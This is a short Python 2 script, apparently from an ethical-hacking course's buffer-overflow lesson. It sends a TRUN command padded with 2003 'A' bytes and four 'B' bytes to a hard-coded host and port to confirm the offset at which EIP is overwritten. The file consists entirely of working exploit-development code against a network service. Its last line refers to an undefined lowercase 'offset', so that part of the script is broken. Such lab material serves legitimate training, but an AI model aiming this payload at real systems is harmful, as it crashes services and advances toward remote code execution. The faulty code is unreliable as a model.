#!/usr/bin/python2

#Inspiration for this came from TCM Academy's Practical Ethical Hacking course in the Buffer Overflow section

import sys, socket

#Target IP
RHOST = '192.168.50.13'
#Target port
RPORT = 9999
#Vulnerable command of program
COMM = 'TRUN /.:/'
#Discovered offset (final number from simplefuzzer tool output)
OFFSET = 2003
BUFFCHAR = 'A'
TESTCHAR = 'B'
TEST = BUFFCHAR * OFFSET + TESTCHAR * 4

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((RHOST, RPORT))
        s.send((COMM + TEST))
        s.close()

except:
        print "Error connecting to server"
        sys.exit()
        
print ("If you see '42424242' as the EIP value in the debugger, you have successfully determined the offset at *" + str(offset) + "* and overwritten the EIP")
